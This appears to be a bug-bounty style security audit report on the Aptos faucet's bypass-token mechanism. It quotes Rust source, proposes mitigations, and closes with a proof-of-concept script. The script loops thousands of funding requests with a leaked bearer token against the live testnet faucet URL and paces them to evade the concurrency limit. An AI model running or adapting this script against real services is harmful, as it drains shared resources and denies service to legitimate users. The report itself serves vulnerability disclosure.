# Audit Report

## Title
Bypass Token Privilege Escalation Enables Faucet Drainage and Denial of Service

## Summary
The Aptos faucet's bypass token mechanism allows any user possessing a valid bypass token to completely circumvent all rate limiting protections, enabling unlimited sequential fund requests that can drain the faucet and deny service to legitimate users.

## Finding Description

The `AuthTokenBypasser.request_can_bypass()` function validates bypass tokens by checking if they exist in a static list loaded from a file. When a request contains a valid bypass token, it bypasses **all** checker validations including rate limiters. [1](#0-0) 

The critical vulnerability exists in the request processing flow where bypassed requests skip all checkers: [2](#0-1) 

When `bypass=true`, the checkers' validation and completion steps are completely skipped: [3](#0-2) 

This means rate limiters (both memory-based and Redis-based) never track or limit bypass token requests. Additionally, bypass tokens can request **higher funding amounts** than normal users: [4](#0-3) 

**Attack Scenario:**
1. Attacker obtains a bypass token through common leakage vectors (exposed configuration files, CI/CD logs, compromised shared credentials, or insider threat)
2. Attacker writes a script to make sequential fund requests using the bypass token
3. Each request bypasses all rate limiting (no tracking in memory or Redis)
4. If `maximum_amount_with_bypass` is configured, attacker can request MORE per transaction than legitimate users
5. Attacker drains faucet funds or exhausts resources through repeated requests
6. Legitimate users receive DoS as faucet becomes unavailable

The only protection is the `concurrent_requests_semaphore`, which limits concurrent requests but provides no defense against sequential attacks: [5](#0-4) 

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos bug bounty program:
- **API crashes**: Repeated bypass requests can exhaust faucet resources (sequence number tracking, transaction submission queue)
- **Validator node slowdowns**: Faucet overload from bypass token abuse impacts connected nodes
- **Denial of Service**: Legitimate users cannot access faucet when it's drained or overloaded

The vulnerability breaks the **Resource Limits** invariant - operations should respect computational and resource limits, but bypass tokens circumvent these protections entirely.

While this doesn't directly impact consensus or Move VM execution, the faucet is critical infrastructure for testnet/devnet operations. Its compromise affects:
- Developer onboarding (cannot fund test accounts)
- CI/CD pipelines (tests requiring funded accounts fail)
- Testnet ecosystem stability

## Likelihood Explanation

**Likelihood: High**

Token leakage occurs frequently in practice:
- Configuration files committed to public repositories
- CI/CD logs exposing environment variables
- Shared team channels (Slack, Discord) containing credentials
- Compromised developer machines
- Insider threats (disgruntled employees, contractors)

Once obtained, exploitation requires minimal sophistication:
- No special infrastructure needed
- Simple HTTP client script (10 lines of code)
- No blockchain-specific knowledge required
- Rate limit bypass is immediate upon token validation

The integration test demonstrates this behavior is **intentional design**: [6](#0-5) 

This test shows bypass tokens receiving 10x the normal amount (1000 vs 100 OCTA), confirming elevated privileges.

## Recommendation

Implement multi-layered defense against bypass token abuse:

**1. Per-Token Rate Limiting:**
```rust
// Add to AuthTokenBypasser struct
pub struct AuthTokenBypasser {
    pub manager: ListManager,
    pub token_usage: Arc<RwLock<HashMap<String, TokenUsageTracker>>>,
    pub max_requests_per_token_per_day: u32,
}

struct TokenUsageTracker {
    count: u32,
    last_reset: u64,
}
```

**2. Token Rotation and Expiration:**
- Add expiration timestamps to token list
- Implement automatic token rotation (e.g., daily/weekly)
- Log token usage for auditing

**3. Graduated Rate Limiting:**
Instead of bypassing ALL checkers, implement a "fast lane" that still enforces limits:
```rust
// Modified preprocess_request flow
if bypass {
    // Still enforce reduced rate limits for bypass tokens
    let bypass_rate_limiter = BypassRateLimiter::new(higher_limit);
    bypass_rate_limiter.check(checker_data.clone()).await?;
}
```

**4. Monitoring and Alerting:**
- Track bypass token usage frequency
- Alert on anomalous patterns (>N requests/minute from single token)
- Automatic token revocation on abuse detection

**5. Configuration Security:**
- Store tokens in secure secret management systems (HashiCorp Vault, AWS Secrets Manager)
- Never commit bypass token lists to version control
- Implement token access audit logs

## Proof of Concept

```rust
// Attack script (pseudocode)
use reqwest;
use serde_json::json;

#[tokio::main]
async fn main() {
    let faucet_url = "http://faucet.testnet.aptoslabs.com/fund";
    let bypass_token = "LEAKED_TOKEN_HERE"; // Obtained through leakage
    let client = reqwest::Client::new();
    
    // Drain faucet with sequential requests
    for i in 0..10000 {
        let request = json!({
            "amount": 1000000000000, // Request maximum with bypass
            "address": format!("0x{:064x}", i), // Different address each time
        });
        
        let response = client
            .post(faucet_url)
            .header("Content-Type", "application/json")
            .header("Authorization", format!("Bearer {}", bypass_token))
            .json(&request)
            .send()
            .await;
            
        match response {
            Ok(resp) if resp.status().is_success() => {
                println!("[{}] Successfully drained {} OCTA", i, 1000000000000);
            },
            _ => {
                println!("[{}] Request failed, but no rate limit applied", i);
            }
        }
        
        // Small delay to avoid triggering concurrent request semaphore
        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
    }
}
```

**Expected Outcome:**
- All 10,000 requests succeed (no rate limiting applied)
- Faucet funds depleted or sequence numbers exhausted
- Legitimate users receive errors when attempting to fund accounts
- Faucet health checks fail due to resource exhaustion

## Notes

This vulnerability represents a **design flaw** rather than an implementation bug. The bypass mechanism intentionally skips all checkers for operational convenience (CI/CD, testing), but lacks the security controls necessary to prevent abuse. The test suite confirms this behavior is working as designed, which makes the issue more concerning - the vulnerability is baked into the architecture.

The faucet component, while not directly part of consensus or Move VM execution, is critical testnet/devnet infrastructure. Its compromise has cascading effects on the Aptos ecosystem's ability to onboard developers and maintain testing environments.

### Citations

**File:** crates/aptos-faucet/core/src/bypasser/auth_token.rs (L30-49)
```rust
#[async_trait]
impl BypasserTrait for AuthTokenBypasser {
    async fn request_can_bypass(&self, data: CheckerData) -> Result<bool> {
        // Don't check if the request has X_IS_JWT_HEADER set.
        if data.headers.contains_key(X_IS_JWT_HEADER) {
            return Ok(false);
        }

        let auth_token = match data
            .headers
            .get(AUTHORIZATION)
            .and_then(|v| v.to_str().ok())
            .and_then(|v| v.split_whitespace().nth(1))
        {
            Some(auth_token) => auth_token,
            None => return Ok(false),
        };

        Ok(self.manager.contains(auth_token))
    }
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L204-215)
```rust
        let permit = match &self.concurrent_requests_semaphore {
            Some(semaphore) => match semaphore.try_acquire() {
                Ok(permit) => Some(permit),
                Err(_) => {
                    return Err(AptosTapError::new(
                        "Server overloaded, please try again later".to_string(),
                        AptosTapErrorCode::ServerOverloaded,
                    ))
                },
            },
            None => None,
        };
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L244-280)
```rust
        // See if this request meets the criteria to bypass checkers / storage.
        for bypasser in &self.bypassers {
            if bypasser
                .request_can_bypass(checker_data.clone())
                .await
                .map_err(|e| {
                    AptosTapError::new_with_error_code(e, AptosTapErrorCode::BypasserError)
                })?
            {
                info!(
                    "Allowing request from {} to bypass checks / storage",
                    source_ip
                );
                return Ok((checker_data, true, permit));
            }
        }

        // Ensure request passes checkers.
        let mut rejection_reasons = Vec::new();
        for checker in &self.checkers {
            rejection_reasons.extend(checker.check(checker_data.clone(), dry_run).await.map_err(
                |e| AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError),
            )?);
            if !rejection_reasons.is_empty() && self.return_rejections_early {
                break;
            }
        }

        if !rejection_reasons.is_empty() {
            return Err(AptosTapError::new(
                format!("Request rejected by {} checkers", rejection_reasons.len()),
                AptosTapErrorCode::Rejected,
            )
            .rejection_reasons(rejection_reasons));
        }

        Ok((checker_data, false, permit))
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L332-347)
```rust
        if !bypass {
            let response_is_500 = match &fund_result {
                Ok(_) => false,
                Err(e) => e.error_code.status().is_server_error(),
            };
            let complete_data = CompleteData {
                checker_data,
                txn_hashes: txn_hashes.clone(),
                response_is_500,
            };
            for checker in &self.checkers {
                checker.complete(complete_data.clone()).await.map_err(|e| {
                    AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError)
                })?;
            }
        }
```

**File:** crates/aptos-faucet/core/src/funder/common.rs (L173-185)
```rust
    /// If a Bypasser let the request bypass the Checkers and
    /// maximum_amount_with_bypass is set, this function will return
    /// that. Otherwise it will return maximum_amount.
    pub fn get_maximum_amount(
        &self,
        // True if a Bypasser let the request bypass the Checkers.
        did_bypass_checkers: bool,
    ) -> Option<u64> {
        match (self.maximum_amount_with_bypass, did_bypass_checkers) {
            (Some(max), true) => Some(max),
            _ => self.maximum_amount,
        }
    }
```

**File:** crates/aptos-faucet/core/src/server/run.rs (L937-982)
```rust
    async fn test_maximum_amount_with_bypass() -> Result<()> {
        make_auth_tokens_file(&["test_token"])?;

        // Assert that a localnet is alive.
        let aptos_node_api_client = aptos_sdk::rest_client::Client::new(
            reqwest::Url::from_str("http://127.0.0.1:8080").unwrap(),
        );
        aptos_node_api_client
            .get_index_bcs()
            .await
            .context("Localnet API couldn't be reached at port 8080, have you started one?")?;

        init();
        let (port, _handle) = {
            // Ensure this server and that for test_mint_funder_*
            // don't start up simultaneously, since they're using the same mint key.
            let _guard = MUTEX.get().unwrap().lock().await;
            let config_content =
                include_str!("../../../configs/testing_mint_funder_local_wait_for_txns.yaml");
            start_server(config_content).await?
        };

        // Make a request for more than maximum_amount. This should be accepted as is
        // because we're including an auth token that lets us bypass the checkers,
        // meaning we're instead bound by maximum_amount_with_bypass.
        let fund_request = get_fund_request(Some(1000));
        unwrap_reqwest_result(
            reqwest::Client::new()
                .post(get_fund_endpoint(port))
                .body(fund_request.to_json_string())
                .header(CONTENT_TYPE, "application/json")
                .header(AUTHORIZATION, "Bearer test_token")
                .send()
                .await,
        )
        .await?;

        // Confirm that the account was given the full 1000 OCTA as requested.
        let response = aptos_node_api_client
            .view_apt_account_balance(
                AccountAddress::from_str(&fund_request.address.unwrap()).unwrap(),
            )
            .await?;

        assert_eq!(response.into_inner(), 1000);

```
